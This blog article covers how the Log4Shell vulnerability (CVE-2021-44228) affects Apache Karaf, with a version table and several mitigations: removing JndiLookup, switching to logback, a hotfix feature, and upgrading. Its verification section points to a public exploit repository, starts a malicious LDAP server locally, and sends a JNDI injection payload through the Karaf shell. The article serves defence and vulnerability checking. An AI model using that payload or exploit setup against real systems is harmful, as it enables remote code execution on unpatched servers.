---
title: "Log4j Vulnerabilities and Apache Karaf (CVE-2021–44228)"
date: 2022-01-12T00:00:00Z
description: "In this article, we are going to take a look at the impact of the recent log4j Zero-Day on Apache Karaf based apps. The situation is evolving, I recommend this page to stay up-to-date."
tags: ["Security", "Development"]
---

In this article, we are going to take a look at the impact of the recent log4j Zero-Day on Apache Karaf based apps. The situation is evolving, I recommend [this page](https://logging.apache.org/log4j/2.x/security.html) to stay up-to-date.

## What Log4j Version am I using?

Apache Karaf uses Log4j indirectly through [PAX Logging](https://github.com/ops4j/org.ops4j.pax.logging).

| Karaf Version | PAX Logging Version | log4j2 version |
| ------------- | --------------------|-----------------|
| 3.0.10        | 1.8.4               | not in use *    |
| 4.0.10        | 1.10.0              | not in use *    |
| 4.1.6         | 1.10.1              | 2.8.2           |
| 4.2.12        | 1.11.9              | 2.14.0          |
| 4.3.3         | 2.0.10              | 2.14.0          |

*includes a log4j2 jar, but not in use in karaf default logger

As we can see, all Karaf 4 versions are affected.

## How can I verify if my karaf based distribution is vulnerable?

The easiest way I found to reproduce the attack is based on the following repository: [https://github.com/ilsubyeega/log4j2-exploits](https://github.com/ilsubyeega/log4j2-exploits)

As indicated in the readme, we can startup manipulated LDAP server through the following two commands:

```bash
$ cd http-server && node index.js
$ cd ldap-server && node index.js
```

Next we startup Karaf (using OpenJDK < 8u121), set the Logger to debug, and send the JNDI Payload to the shell.

```bash
karaf@root()> log:set debug
karaf@root()> shell:exec '${jndi:ldap://127.0.0.1:3001/}'
```

## Mitigation Option 1: Remove JNDI Lookup

One option to get rid of the vulnerability is to remove the Log4j JNDI Lookup class from the classpath, this can be achieved by executing the following commands:

```bash
$ cd karaf-directory
$ zip -q -d $(find . | grep pax-logging-log4j2 | grep jar) org/apache/logging/log4j/core/lookup/JndiLookup.class
$ zip -q -d $(grep -rlnw . -e "pax-logging-log4j2" | grep "data/cache/bundle" | grep jar) org/apache/logging/log4j/core/lookup/JndiLookup.class
```

Those commands were tested with Karaf 4.1, 4.2 and 4.3

## Mitigation Option 2: Switch to Logback

Karaf comes with logback support. This option will break some log-related functionality (for instance `log:display` stopped working). Depending on your use case it may be worth a try. Switching to logback can be done by executing the following commands on the karaf shell:

```bash
karaf@root()> shell:exec curl -o etc/logback.xml https://raw.githubusercontent.com/pedestal/samples/master/auto-reload-server/config/logback.xml
karaf@root()> shell:exec echo "org.ops4j.pax.logging.StaticLogbackContext=true" >> etc/system.properties
karaf@root()> shell:exec echo "org.ops4j.pax.logging.StaticLogbackFile=etc/logback.xml" >> etc/system.properties
karaf@root()> feature:install framework-logback
karaf@root()> feature:uninstall framework
# Restart Karaf
```

This will completely remove log4j2 from your classpath. You likely want to customize the logback.xml file in the etc folder.

## Mitigation Option 3: Create a hotfix-feature

Another option is to create a custom hotfix feature (based on the published [framework feature XML](https://repo1.maven.org/maven2/org/apache/karaf/features/framework/4.3.3/framework-4.3.3-features.xml)). You replace the vulnerable PAX Logging Version with a secure one (1.11.12 for Karaf 4.1.x / 4.2.x and 2.11.13 for Karaf 4.3.x). This is only an option if you have your own Artifact Management System (like Nexus or Artifactory)

## Honorable Mentions / Weak Workarounds:

You *can* try the following options:

- Adding `log4j2.formatMsgNoLookups` in your karaf's **system.properties** for Karaf 4.2/4.3
- Replace `%m` with `%m{nolookups}` in (for karaf 4.1) your **org.ops4j.pax.logging.cfg**.

However, I don't recommend them, as there were reports of bypasses of those mitigations.

## Upgrading Karaf

A clean solution is — of course — to upgrade your karaf container to a version that uses a safe log4j version out-of-the-box. Karaf Version 4.2.14 and 4.3.5 are [available](https://karaf.apache.org/news.html).
